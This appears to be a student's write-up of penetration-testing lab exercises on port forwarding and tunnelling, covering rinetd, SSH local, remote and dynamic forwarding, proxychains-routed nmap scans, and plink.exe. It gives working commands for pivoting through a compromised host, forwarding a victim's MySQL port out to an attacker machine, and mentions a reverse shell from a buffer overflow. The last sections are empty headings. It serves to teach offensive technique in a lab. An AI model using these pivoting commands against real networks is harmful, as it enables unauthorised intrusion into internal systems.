# 20.1.2 Port Forwarding
**1.  Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.**

In preparation for the following exercise we simply need to ssh into our Debian machine and run the required script as root.



**2.  Attempt to replicate the port-forwarding technique covered in the above scenario.**

once our systems are prepared for the exercise we begin by checking the connectivity of both machines. Doing so will show us that although our local, Kali machine is able to reach the internet our Debian lab client will have no connection. 
Local Kali Machine
![[Pasted image 20220727202728.png]]

Debian Lab Client
![[Pasted image 20220727202848.png]]

In order to route Google's traffic to our Debian machine we will be utilizing RINETD, once installed we can navigate to the config folder found at /etc/rinetd.conf. We make the following edit to the configuration fire:
![[Pasted image 20220727203726.png]]
This will forward all traffic our Kali machine receives on port 80 to the Google IP and port and specified earlier.

Upon restarting the service we can see that we are now listening on port 80.
![[Pasted image 20220727203949.png]]

Now to verify our connection, let's switch back to our Debian lab machine and attempt to connect to our listening Kali machine.
![[Pasted image 20220727204428.png]]
And we see we get a 200 OK from google, redirected through our Kali machine.

# 20.2.2 SSH Local Port Forwarding
**1.  Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.**

As we did previously, we simply need to run the requested script.

**2.  Run the ssh_local_port_forwarding.sh script from /root/port_forwarding_and_tunneling/ as root.**

In addition to the clear_rules.sh script we must also run the ssh_local_port_forwarding.sh script in the same directory.

**3.  Take note of the Linux client and Windows Server 2016 IP addresses shown in the Student Control Panel.**

Running the "ip a" command on the Linux client we see two IP addresses running under two separate network interfaces. This signifies that the machine is connected to two separate networks.
![[Pasted image 20220728154901.png]]
Running "ipconfig" on our Windows machine shows a similar setup.
![[Pasted image 20220728155012.png]]

**4.  Attempt to replicate the smbclient enumeration covered in the above scenario.**

To establish a connection to the Windows client running on the internal network we will need to leverage a tunnel from our Kali machine through the compromised Linux machine, arriving at the Windows server machine. We can do this via the following SSH command:
`sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128`

This utilizes the following SSH syntax:
`ssh -N -L [bind_address:]port:host:hostport [username@address]`

After adjusting our smb.conf file, setting the minimum SMB version to SMBv2 we can restart the service and attempt to enumerate the shares (note we are using "localhost" in the command due to the tunnel).
![[Pasted image 20220728161021.png]]

# 20.2.4 SSH Remote Port Forwarding

**1. Connect to your dedicated Linux lab client via SSH and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.**

As with previous sections, simply navigate to the proper directory and run the requested scripts as root.

**2. Close any SSH connections to your dedicated Linux lab client and then connect as the student account using rdesktop and run the ssh_remote_port_forward.sh script from /root/port_forwarding_and_tunneling/ as root.**

For this exercise we need to now run the next script while connected via rdesktop. This is to ensure SSH rules are created correctly.
![[Pasted image 20220728174816.png]]

**3. Attempt to replicate the SSH remote port forwarding covered in the above scenario and ensure that you can scan and interact with the MySQL service.**

As we are unable to access the Debian client from our Kali machine via SSH we must initiate the connection on the Debian machine, forwarding the remote port to our local Kali machine. To do this we can use a similar command as we used previously, replacing a few of the variables and flags.

The following command, run on our Debian client should forward the proper ports to our Kali machine:
`ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4`
(note: ensure ssh service is currently running on local machine)
![[Pasted image 20220728175357.png]]

And we now have access to MYSQL being run on the remote Debian client.
![[Pasted image 20220728175558.png]]

# 20.2.6 SSH Dynamic Port Forwarding

**1.  Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.**

As with previous sections, simply navigate to the proper directory and run the requested scripts as root.

**2.  Take note of the Linux client and Windows Server 2016 IP addresses.**

We can see from our lab control panel the following IPs:
Debian: 192.168.197.44
Windows 2016 Server: 172.16.197.5

**3.  Create a SOCKS4 proxy on your Kali machine, tunneling through the Linux target.**

We can create the proxy using the following command:
`sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128`

**4.  Perform a successful nmap scan against the Windows Server 2016 machine through the proxy.**

First, we then need to setup proxychains to run standard network applications through our created proxy. We do this by simply appended `socks4 127.0.0.1 8080` to our proxychains4.conf file.

Now that proxychains is setup we can use it by adding "proxychains" a the start of our commands. For the requested nmap scan the following command can be used:
`sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110`
![[Pasted image 20220728184302.png]]

**5.  Perform an nmap SYN scan through the tunnel. Does it work? Are the results accurate?**

By altering the previous command from a TCP connect scan (-sT) to a SYN scan (-sS) we get the following results.
![[Pasted image 20220728185447.png]]
Note that all the ports are marked as filtered, indicated an unsuccessful scan. This is due to the lack of a payload for proxychains to forward.
# 20.3.1 PLINK.exe

**1.  Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.**

We can obtain a reverse shell by utilizing our initial buffer overflow payload we crafted in section 11.
![[syncbreeze_buffer_shell.png]]

**2.  Use plink.exe to establish a remote port forward to the MySQL service on your Windows 10 client.**
As we are unable to reach the MYSQL service from our Kali machine we can utiilize the plink.exe application to forward us the port. We do this by executing the plink.exe binary on the Windows machine with the following command:
`plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`

This will execute plink and instruct it to ssh into our Kali machine with the credentials "kali:ilak" and remote port forward the address/port of our Kali box (10.11.0.4:1234) to the MYSQL port running on localhost (127.0.0.1:3306) We can also pipe "cmd.exe /c echo y" to this command in order provide an answer to the "Store key in chase" question which will be prompted the first time the tool runs.
`cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
`cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 192.168.119.197:1234:127.0.0.1:3306 192.168.119.197



**3.  Scan the MySQL port via the remote port forward.**


# 20.4.1 NETSH
**1.  Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.**


**2.  Using the SYSTEM shell, attempt to replicate the port forwarding example using netsh.**

# 20.5.1 HTTPTunneling Through Deep Packet Inspection
**1.  Connect to your dedicated Linux lab client as the student account using rdesktop and run the http_tunneling.sh script from /root/port_forwarding_and_tunneling/ as root.**


**2.  Start the apache2 service and exploit the vulnerable web application hosted on port 443 (covered in a previous module) in order to get a reverse HTTP shell.**


**3.  Replicate the scenario demonstrated above using your dedicated clients.**